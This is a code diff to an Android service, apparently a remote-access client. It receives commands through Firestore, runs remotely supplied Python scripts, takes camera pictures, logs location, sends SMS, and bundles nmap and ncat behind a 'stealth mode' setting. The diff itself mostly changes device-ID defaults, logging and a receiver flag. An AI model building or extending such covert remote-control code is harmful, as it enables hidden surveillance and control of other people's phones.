@@ -78,6 +78,7 @@ import android.telephony.TelephonyManager
 import android.util.Log
 import android.webkit.MimeTypeMap
 import android.widget.Toast
+import androidx.annotation.RequiresPermission
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import androidx.core.content.FileProvider
@@ -131,7 +132,6 @@ import com.google.firebase.storage.StorageReference
 import com.google.gson.Gson
 import com.google.gson.JsonObject
 import dalvik.system.DexClassLoader
-import dalvik.system.DexFile
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
@@ -139,7 +139,6 @@ import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import org.json.JSONObject
 import java.io.BufferedReader
-import java.io.BufferedWriter
 import java.io.DataOutputStream
 import java.io.File
 import java.io.FileInputStream
@@ -148,7 +147,6 @@ import java.io.FileWriter
 import java.io.IOException
 import java.io.InputStreamReader
 import java.io.OutputStream
-import java.io.OutputStreamWriter
 import java.lang.reflect.Method
 import java.net.HttpURLConnection
 import java.net.Inet4Address
@@ -161,7 +159,6 @@ import java.util.Arrays
 import java.util.Base64
 import java.util.Calendar
 import java.util.Date
-import java.util.Enumeration
 import java.util.Locale
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
@@ -5304,7 +5301,7 @@ fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context
                     args = command.removePrefix("RUN_PYTHON_SCRIPT $filePath <!|!> ").split(" ")
                     sendMessage(c, false, "RUN_PYTHON_SCRIPT: Thread Index: ${threads.size - 1}", messageID, serverID)
                     Log.d("ClientService", "Running python file $filePath with args $args")
-                    val output = PythonRunner.runPythonScriptWithArgs(filePath, args)
+                    val output = PythonRunner.runPythonScriptWithArgs(filePath, args, context, applicationContext)
                     sendMessage(
                         context,
                         false,
@@ -6478,11 +6475,11 @@ class ClientService: Service() {
         phoneNumberToUse = preferences.getString("PhoneNoToUse", "").toString()
         isSendingSMSAllowed = preferences.getBoolean("isSendingSMSAllowed", true)
         try {
+            currentDeviceID = preferences.getString("DeviceID", getDefaultDeviceID()).toString()
             serverPhoneNumbers =
                 preferences.getString("ServerPhoneNumber", "")?.split(",")!!
                     .toMutableList()
             isLocked = preferences.getBoolean("IsLocked", false)
-            currentDeviceID = preferences.getString("DeviceID", "0").toString()
             isStealthModeEnabled = preferences.getBoolean("IsStealthModeEnabled", false)
             isLockedWithPin = preferences.getBoolean("IsLockedWithPin", false)
             startLoggingLocation = preferences.getBoolean("StartLoggingLocation", false)
@@ -6545,6 +6542,7 @@ class ClientService: Service() {
                     )
                 }
             }
+            Log.d("ClientService", "Device ID: ${currentDeviceID}")
             firestore.collection("Devices").document(currentDeviceID).set(hashMapOf<String,Any>(
                 "Device ID" to currentDeviceID,
                 "Build.VERSION.BASE_OS" to Build.VERSION.BASE_OS,
@@ -6626,7 +6624,7 @@ class ClientService: Service() {
             Log.d("ClientService", "Created nmap symlink.")
             val ncatFile = File(nmapBinDir, "ncat")
             Os.symlink(
-                File(applicationInfo.nativeLibraryDir, "libncat.so").absolutePath,
+                File(applicationInfo.nativeLibraryDir, "ncat.so").absolutePath,
                 ncatFile.absolutePath
             )
             Log.d("ClientService", "Created ncat symlink.")
@@ -6874,7 +6872,8 @@ class ClientService: Service() {
                         addAction(ACTION_START_WIFI_P2P_SERVER)
                         addAction(ACTION_STOP_WIFI_P2P_SERVER)
                         addAction(ACTION_WIFI_P2P_GET_HOST_ADDRESS)
-                    }
+                    },
+                    RECEIVER_EXPORTED
                 )
             }
             Log.d("ClientService", "Registered WiFi P2P start stop broadcast receiver")
@@ -6883,7 +6882,7 @@ class ClientService: Service() {
             Log.e("ClientService", "Failed to register WiFi P2P start stop broadcast receiver")
         }
         Log.d("ClientService", "Current Device ID: $currentDeviceID")
-        Log.d("ClientService", "Service Device IDs: $serverDeviceIDs")
+        Log.d("ClientService", "Server Device IDs: $serverDeviceIDs")
 
         val messagesRef = firestore.collection("Messages")
         val listener = EventListener<QuerySnapshot> { snapshot, error ->
@@ -6894,7 +6893,7 @@ class ClientService: Service() {
             if (snapshot != null) {
                 for (change in snapshot.documentChanges) {
                     preferences = getSharedPreferences("Preferences", Context.MODE_MULTI_PROCESS)
-                    currentDeviceID = preferences.getString("DeviceID", "0").toString()
+                    currentDeviceID = preferences.getString("DeviceID", getDefaultDeviceID()).toString()
                     if (currentDeviceID != "") {
                         val document = change.document
                         val type = change.type
@@ -6902,7 +6901,7 @@ class ClientService: Service() {
                         val command = document.getString("Message")
                         val forId = document.get("For")
                         Log.d("ClientService", "Received command for $forId from $serverID: $command")
-                        Log.d("ClientService", "${type == DocumentChange.Type.ADDED} && ${forId == currentDeviceID} && ${serverID in serverDeviceIDs}")
+//                        Log.d("ClientService", "${type == DocumentChange.Type.ADDED} && ${forId == currentDeviceID} && ${serverID in serverDeviceIDs}")
                         if (type == DocumentChange.Type.ADDED && document.exists() && forId == currentDeviceID && serverID in serverDeviceIDs) {
                             Log.d("ClientService", "Received command from server: $command")
                             if (document.contains("Message")) {
@@ -7298,28 +7297,6 @@ class ClientService: Service() {
         }, 2000)
     }
 
-    private suspend fun handleClient(socket: Socket) {
-        try {
-            val reader = BufferedReader(InputStreamReader(socket.getInputStream()))
-            val writer = BufferedWriter(OutputStreamWriter(socket.getOutputStream()))
-            var line: String?
-            while (reader.readLine().also { line = it } != null) {
-                Log.d("ClientService", "Received from client: $line")
-                writer.write("Echo: $line\n")
-                writer.flush()
-            }
-        } catch (e: Exception) {
-            Log.e("ClientService", "Error handling client connection", e)
-        } finally {
-            try {
-                socket.close()
-                Log.d("ClientService", "Closed client connection")
-            } catch (e: IOException) {
-                Log.e("ClientService", "Error closing client socket", e)
-            }
-        }
-    }
-
     private fun takePicture(imagePath: String, messageID: String?, serverID: String?) {
         if (!cameraInitialized) {
             return
@@ -7411,5 +7388,27 @@ class ClientService: Service() {
                 sendMessage(this@ClientService, false, "SWITCH_TO_CAMERA: Operation failed", messageID, serverID)
             }
         }, null)
+    }
+
+    fun getDefaultDeviceID(): String {
+        try {
+            if (ActivityCompat.checkSelfPermission(
+                    this,
+                    Manifest.permission.BLUETOOTH_CONNECT
+                ) == PackageManager.PERMISSION_GRANTED
+            ) {
+                val bluetoothAdapter = BluetoothAdapter.getDefaultAdapter()
+                val deviceBluetoothName = bluetoothAdapter?.name
+                return if (deviceBluetoothName?.isNotEmpty() == true) {
+                    deviceBluetoothName
+                } else {
+                    "0"
+                }
+            } else {
+                return "0"
+            }
+        } catch (e: Exception) {
+            return "0"
+        }
     }
 }
